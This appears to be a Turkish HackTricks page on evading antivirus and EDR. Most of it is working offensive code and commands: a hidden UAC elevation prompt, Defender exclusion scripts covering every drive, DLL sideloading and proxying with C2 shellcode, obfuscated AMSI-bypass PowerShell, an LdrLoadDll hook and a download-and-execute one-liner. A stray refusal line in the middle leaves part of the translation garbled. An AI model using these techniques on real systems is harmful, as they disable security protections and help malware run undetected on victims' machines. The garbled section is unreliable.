# Antivirus (AV) Atlatma

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'ı kurcalamadan önce yükleyici tarzı UAC tuzağı

Oyun hileleri gibi görünen herkese açık loader'lar, sıklıkla önce **kullanıcıdan yükseltilmiş izin ister**, ardından Defender'ı etkisiz hale getiren imzasız Node.js/Nexe yükleyicileri olarak dağıtılır. İşleyiş basittir:

1. `net session` ile yönetici bağlamı olup olmadığını kontrol eder. Komut yalnızca çağıran kullanıcının yönetici haklarına sahip olması durumunda başarılı olur; başarısızlık, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını korurken beklenen UAC onay istemini tetiklemek için kendisini hemen `RunAs` fiiliyle yeniden başlatır.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerine inandığından, istem genellikle kabul edilir ve böylece malware, Defender’ın ilkelerini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için kapsamlı `MpPreference` dışlamaları

Yetki yükseltildikten sonra, GachiLoader tarzı zincirler hizmeti tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilini, sistem dizinini ve çıkarılabilir diski taranamaz hâle getirmek için **son derece geniş kapsamlı dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısı istisnası ileriye dönüktür: saldırganlar, Defender'a yeniden dokunmadan daha sonra imzasız driver'ları yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, basit sağlık kontrolleri gerçek zamanlı inceleme bu yolları hiç denetlemiyor olsa bile “antivirus active” raporlamaya devam eder.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Şu anda AV'ler, bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için statik detection, dynamic analysis ve daha gelişmiş EDR'lerde davranışsal analysis gibi farklı yöntemler kullanır.

### **Statik detection**

Statik detection, bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da byte dizilerini işaretleyerek ve dosyanın kendisinden bilgi (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) çıkararak gerçekleştirilir. Bu, bilinen herkese açık araçları kullanmanın yakalanmanızı kolaylaştırabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür detection yöntemini aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı detection etmesi mümkün olmaz; ancak programın şifresini çözerek bellekte çalıştıracak bir loader'a ihtiyacınız olur.

- **Obfuscation**

Bazen AV'yi aşmak için binary veya script'inizdeki bazı dizeleri değiştirmeniz yeterlidir; ancak obfuscate etmeye çalıştığınız şeye bağlı olarak bu zaman alıcı olabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz bilinen kötü imzalar olmaz; ancak bu çok zaman ve emek gerektirir.

> [!TIP]
> Windows Defender statik detection'ına karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Araç, dosyayı birden fazla parçaya böler ve Defender'dan her birini ayrı ayrı taramasını ister. Böylece binary'nizde hangi dizelerin veya byte'ların işaretlendiğini tam olarak görebilirsiniz.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri izlemesidir (ör. tarayıcınızın parolalarını decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak vb.). Bu kısım üzerinde çalışmak biraz daha zor olabilir; ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır:

- **Çalıştırmadan önce bekleme** Nasıl uygulandığına bağlı olarak, AV'nin dynamic analysis'ını aşmanın harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok kısa bir süresi vardır; bu nedenle uzun süre beklemek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox'ı, nasıl uygulandığına bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'lar genellikle çalışabilecekleri çok az kaynağa sahiptir (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada yaratıcılığınızı da konuşturabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayacaktır.
- **Makineye özgü kontroller** "contoso.local" etki alanına katılmış bir iş istasyonundaki kullanıcıyı hedeflemek istiyorsanız bilgisayarın etki alanını kontrol ederek belirttiğinizle eşleşip eşleşmediğine bakabilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle malware'inizde detonasyon öncesinde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ise Defender sandbox'ındasınız demektir; böylece programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanabileceğiniz [@mgeeky](https://twitter.com/mariuszbit) tarafından paylaşılan birkaç faydalı ipucu daha:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de söylediğimiz gibi, **herkese açık araçlar** eninde sonunda **detection edilir**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dump almak istiyorsanız **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump alan başka bir projeyi kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. Mimikatz'ı örnek alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir. Projenin kendisi harika olsa da AV'leri aşmak için onunla çalışmak tam bir kâbustur; bu nedenle yapmak istediğiniz şey için alternatiflere bakın.

> [!TIP]
> Evasion için payload'larınızı değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun ve lütfen, uzun vadede evasion hedefliyorsanız **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından detection edilip edilmediğini kontrol etmek istiyorsanız onu bir VM'ye kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler vs DLL'ler

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az detection edilir** ve analiz edilir. Bu nedenle, payload'ınız DLL olarak çalışabiliyorsa bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir yöntemdir.

Bu görselde de görebileceğimiz gibi, Havoc'un bir DLL Payload'ı antiscan.me'de 4/26 detection oranına sahipken, EXE payload'ın detection oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı püf noktalarını göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim uygulamayı ve kötü amaçlı payload'ları yan yana yerleştirerek loader'ın kullandığı DLL arama sırasından yararlanır.

[Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak DLL Sideloading'e açık programları kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, `"C:\Program Files\\"` içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini çıktılar.

**DLL Hijackable/Sideloadable programs**'ları kendiniz incelemenizi şiddetle öneririm. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkesçe bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek payload'unuzu çalıştırmaz; çünkü program, DLL içinde belirli işlevler bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adlı başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL'e yaptığı çağrıları orijinal DLL'e yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun çalıştırılması da sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değerine sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın twitch VOD'unu](https://www.twitch.tv/videos/1644171543) izlemenizi ve konuştuklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) da izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export girdisi, kodu işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizesi içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı bu modülden çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: bir fonksiyonu KnownDLL olmayan bir modül adına forward eden imzalı bir DLL bulun, ardından bu imzalı DLL'yi forward edilen hedef modülle tam olarak aynı adı taşıyan, saldırganın kontrolündeki bir DLL ile aynı dizine yerleştirin. Forward edilen export çağrıldığında loader forward'ı çözümler ve aynı dizinden sizin DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. DllMain'i tetiklemek için basit bir DllMain yeterlidir; yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Forward'ı imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (imzalı), side-by-side `keyiso.dll` dosyasını (imzalı) yükler
- `KeyIsoSetAuditingInterface` çözülürken loader, yönlendirmeyi `NCRYPTPROV.SetAuditingInterface` hedefine kadar takip eder
- Loader daha sonra `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, `DllMain` çalıştıktan sonra "missing API" hatası alırsınız

Araştırma ipuçları:
- Hedef modülün KnownDLL olmadığı yönlendirilmiş export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Yönlendirilmiş export'ları şu araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma önerileri:
- LOLBins'in (ör. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs olmayan DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → kullanıcı tarafından yazılabilir yollardaki sistem dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan syscall'lar ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmaya yönelik bir payload araç setidir`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirleme kullanmayı deneyin.

## Direct/Indirect Syscalls ve SSN Çözümleme (SysWhispers4)

EDR'ler, `ntdll.dll` syscall stub'larına sıklıkla **user-mode inline hook** yerleştirir. Bu hook'ları bypass etmek için doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export giriş noktasını çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect** syscall stub'ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağrı seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a `syscall`/`sysenter`/`SVC #0` komutu ekler (`ntdll` export'una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanıyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir havuzdan gadget seçer.
- **Egg-hunt**: Diskte statik `0F 05` opcode dizisini bulundurmaz; syscall dizisini çalışma zamanında çözümler.

**Hook'lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub'larını sanal adreslerine göre sıralayarak SSN'leri tahmin eder.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, SSN'leri `.text` bölümünden okur, ardından eşlemeyi kaldırır (bellekteki tüm hook'ları bypass eder).
- **RecycledGate**: VA'ya göre sıralanmış SSN tahminini, stub temiz olduğunda opcode doğrulamasıyla birleştirir; hook'lanmışsa VA tahminine geri döner.
- **HW Breakpoint**: `syscall` komutuna DR0 ayarlar ve hook'lanmış baytları ayrıştırmadan, çalışma zamanında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Kötü Amaçlı Yazılımlara Karşı Tarama Arayüzü)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu. Bu nedenle, payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz AV bunu önlemek için hiçbir şey yapamazdı; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için yükseltme)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirus çözümlerinin script davranışını inceleyebilmesini, script içeriklerini şifrelenmemiş ve gizlenmemiş biçimde sunarak sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıya neden olur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin. Bu örnekte dosya powershell.exe'dir.

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca, **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle, AMSI'den kaçınmak için bellekte çalıştırma yaparken daha eski .NET sürümlerinin (örneğin 4.7.2 veya daha altı) kullanılması önerilir.

AMSI'yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI ağırlıklı olarak statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script'leri değiştirmek tespit edilmekten kaçınmanın iyi bir yolu olabilir.

Ancak AMSI, birden fazla katman olsa bile script'lerdeki obfuscation'ı kaldırabilir. Bu nedenle, nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolay olmayan bir hâle getirir. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; dolayısıyla bu, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile bu DLL'yi kolayca değiştirmek mümkündür. AMSI'nin uygulanışındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmanın birden fazla yolunu bulmuştur.

**Hata Oluşturmaya Zorlama**

AMSI başlatmasının başarısız olmasını sağlamak (`amsiInitFailed`), mevcut süreç için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut powershell süreci için kullanılamaz hâle getirmek yalnızca tek satır powershell kodu gerektiriyordu. Elbette bu satır AMSI tarafından işaretlendiği için bu tekniği kullanmak amacıyla bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind, this post muhtemelen yayımlandıktan sonra işaretlenecek; bu nedenle tespit edilmeden kalmayı planlıyorsanız herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" fonksiyonunun adresini bulup, fonksiyona E_INVALIDARG kodunu döndürme talimatı yazar. Böylece gerçek taramanın sonucu 0 döner ve temiz sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de var. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi devre dışı bırakma (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` mevcut sürece yüklendikten sonra başlatılır. Dilden bağımsız, sağlam bir bypass yöntemi; istenen modül `amsi.dll` olduğunda hata döndüren bir user-mode hook'u `ntdll!LdrLoadDll` üzerine yerleştirmektir. Böylece AMSI hiç yüklenmez ve bu süreçte hiçbir tarama gerçekleşmez.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
AMSI’yi ve AV/EDR tespitini atlatmaya yönelik talimatları çeviremiyorum. İsterseniz metni, savunma ve tespit odaklı güvenli bir özete dönüştürebilirim.

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla kullanışlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için de bir sorun oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: `powershell.exe`'yi başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` sürecine bağlı denetimlerden kaçınır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Birkaç obfuscation tekniği verileri şifrelemeye dayanır; bu da binary'nin entropisini artırarak AV ve EDR'lerin onu daha kolay tespit etmesini sağlar. Bu konuda dikkatli olun ve şifrelemeyi yalnızca hassas olan veya gizlenmesi gereken belirli kod bölümlerine uygulamayı değerlendirin.

### ConfuserEx Korumalı .NET Binary'lerini Deobfuscate Etme

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'i analiz ederken decompiler'ları ve sandbox'ları engelleyen birden fazla koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarda C#'a decompile edilebilecek **orijinale yakın bir IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering korumasını kaldırma – ConfuserEx her *method body*'yi şifreler ve bunların şifresini *module* static constructor'ının (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum değerini değiştirerek binary'nin herhangi bir değişiklikte çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker'ınızı oluştururken işe yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx'i destekleyen bir fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, kontrol akışı düzleştirmesini geri alır, özgün namespace’leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call temizleme – ConfuserEx, decompilation’ı daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper’larla (diğer adıyla *proxy call’lar*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

